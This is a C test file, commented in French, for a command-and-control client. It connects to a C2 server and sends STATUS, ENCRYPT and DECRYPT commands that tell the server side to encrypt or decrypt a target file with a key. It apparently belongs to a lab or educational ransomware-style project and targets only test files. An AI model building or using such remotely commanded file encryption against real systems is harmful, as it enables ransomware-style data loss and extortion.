#include "../c2_client.h"
#include <stdio.h>
#include <string.h>

/*
 * Fonction : test_command
 * Description : Envoie une commande au serveur et affiche la réponse
 * Paramètres :
 *   - sock : Socket connecté au serveur
 *   - command : Commande à envoyer (STATUS, ENCRYPT, DECRYPT)
 *   - target : Cible de la commande (fichier)
 *   - mode : Mode de chiffrement (0=XOR, 1=César, etc.)
 *   - key : Clé de chiffrement
 */
void test_command(int sock, const char *command, const char *target, int mode, const char *key) {
    C2Command cmd;
    memset(&cmd, 0, sizeof(cmd));

    // Copier les paramètres dans la structure de commande
    strncpy(cmd.command, command, sizeof(cmd.command)-1);
    if (target) strncpy(cmd.target, target, sizeof(cmd.target)-1);
    if (key) strncpy(cmd.key, key, sizeof(cmd.key)-1);
    cmd.mode = mode;

    printf("Envoi commande %s...\n", command);
    C2Response resp = c2_send_command(sock, &cmd);
    printf("Réponse: %s (status=%d)\n\n", resp.message, resp.status);
}

int main() {
    printf("=== Test Client C2 ===\n");
    printf("Connexion au serveur C2 (%s:%d)...\n", C2_SERVER_IP, C2_SERVER_PORT);

    // Connexion au serveur
    int sock = c2_connect(C2_SERVER_IP, C2_SERVER_PORT);
    if (sock < 0) {
        printf("❌ Connexion échouée (le serveur est-il démarré ?)\n");
        return 1;
    }
    printf("✓ Connecté au serveur C2\n\n");

    // Test 1: Commande STATUS
    test_command(sock, "STATUS", NULL, 0, NULL);

    // Test 2: Commande ENCRYPT
    test_command(sock, "ENCRYPT", "test_files/documents/test.txt", 0, "secret123");

    // Test 3: Commande DECRYPT
    test_command(sock, "DECRYPT", "test_files/documents/test.txt", 0, "secret123");

    // Déconnexion
    c2_disconnect(sock);
    printf("✓ Déconnecté\n");
    return 0;
}
